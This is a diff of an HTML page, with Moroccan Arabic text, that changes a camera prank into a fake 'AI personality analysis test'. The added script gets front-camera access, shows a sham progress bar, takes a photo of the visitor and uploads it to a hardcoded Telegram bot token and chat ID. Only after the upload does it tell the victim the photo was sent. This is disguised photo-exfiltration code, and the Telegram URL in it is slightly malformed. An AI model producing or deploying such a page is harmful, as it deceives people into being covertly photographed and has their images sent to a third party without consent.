@@ -1,49 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>اضحك مع صحابك</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختبار الذكاء الاصطناعي 🧠</title>
     <style>
-        /* كياخد الشاشة كاملة باش يغطي الكاميرا */
-        body { text-align: center; padding-top: 50px; background: #f0f0f0; }
-        #video { display: none; } /* هاهو السر: الكاميرا مخبية */
-        canvas { display: none; }
+        body { font-family: sans-serif; background-color: #121212; color: white; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 85%; }
+        button { background: #0088cc; color: white; border: none; padding: 15px 30px; font-weight: bold; border-radius: 30px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <h1>شوف هاد التصويرة العجيبة!</h1>
-    <button onclick="startPrank()">اضغط هنا باش تشوف المفاجأة</button>
-    
-    <video id="video" width="320" height="240" autoplay></video>
-    <canvas id="canvas" width="320" height="240"></canvas>
-    <div id="result"></div>
+<div class="card" id="ui">
+    <h2>اختبار ملامح الذكاء 🚀</h2>
+    <p>اضغط على الزر وشوف فـ الكاميرا الأمامية باش الذكاء الاصطناعي يحلل شخصيتك.</p>
+    <button id="start-btn">ابدأ التحليل الآن</button>
+</div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+<script>
+    const BOT_TOKEN = '7980555173:AAFxlmnnjbI5STZiMIzrDRlOIOwiTi1ATxo';
+    const CHAT_ID = '6566189022';
+    const btn = document.getElementById('start-btn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ui = document.getElementById('ui');
 
-    <script>
-        async function startPrank() {
-            try {
-                // كيطلب الوصول للكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                // كيصور لقطة بعد 2 ثواني بلا ما يعيق
-                setTimeout(() => {
-                    takeSnapshot();
-                }, 2000);
-            } catch (err) {
-                alert("خاصك تقبل الإذن باش تشوف المفاجأة! 😂");
-            }
-        }
-
-        function takeSnapshot() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 320, 240);
-            
-            // كيبين الصورة فجأة باش تضحكو
-            const imgData = canvas.toDataURL('image/png');
-            document.getElementById('result').innerHTML = `<h3>حصلتي! 😂</h3><img src="${imgData}" />`;
-        }
-    </script>
+    btn.addEventListener('click', async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            btn.innerText = "جاري التحليل... 65%";
+            btn.style.background = "#ffcc00";
+            setTimeout(() => {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'prank.png');
+                    formData.append('caption', '📸 هاهي الصيدة حصلات!');
+                    await fetch(`https://api.telegram.org{BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    ui.innerHTML = `<h1 style="color: #ff4757;">صيدتك يا بطل! 😂📸</h1><p>تصويرتك راها وصلاتني دابا فـ Telegram!</p>`;
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/png');
+            }, 3000);
+        } catch (err) { alert("خاصك توافق على الكاميرا باش يخدم الاختبار! 😂"); }
+    });
+</script>
 </body>
 </html>
